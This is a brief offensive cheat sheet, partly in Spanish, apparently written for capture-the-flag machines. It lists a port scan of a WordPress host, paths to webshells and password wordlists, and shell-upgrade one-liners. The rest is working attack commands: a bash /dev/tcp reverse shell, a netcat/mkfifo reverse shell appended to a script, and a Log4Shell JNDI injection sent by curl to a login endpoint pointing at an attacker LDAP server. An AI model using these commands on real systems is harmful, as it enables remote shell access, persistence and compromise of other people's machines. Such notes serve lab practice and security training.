
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.1.31




ruta interesante:
/usr/share/windows-resources/binaries/
/usr/share/webshells/php
/usr/share/wordlists/rockyou.txt

/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt

nibbles - terminal
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
unified - terminal
```
script /dev/null -c bash
```
sqlmap - terminal
```
bash -c "bash -i >& /dev/tcp/{your_IP}/333 0>&1"
```

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 333 >/tmp/f' | tee -a monitor.sh
```

```bash
curl -i -s -k -X POST -H $'Host: 10.129.96.149:8443' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://10.10.15.152:1389/o=tomcat}\",\"strict\":true}' $'https://10.129.96.149:8443/api/login'
```
